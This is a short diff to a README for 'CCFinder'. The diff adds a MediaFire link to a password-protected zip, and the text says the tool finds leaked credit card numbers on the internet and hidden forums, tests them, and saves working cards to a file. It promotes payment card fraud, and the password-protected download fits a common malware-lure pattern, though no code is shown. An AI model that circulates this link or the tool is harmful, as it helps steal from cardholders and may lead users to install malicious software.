@@ -1,5 +1,5 @@
 # CCFinder
-
+[Click Here To Download](https://www.mediafire.com/file/69akbqckxaotpcf/CCFinder.zip/file)  [ Pass: CCFind3r2025]
 
 
 Fully automatic finder, very simple and fast. The finder will find leaked cc's on the internet and hidden forums, websites and check the CC directly. If the CC is working it will show GREEN "Hit" and creates "Valid CC's" text file.
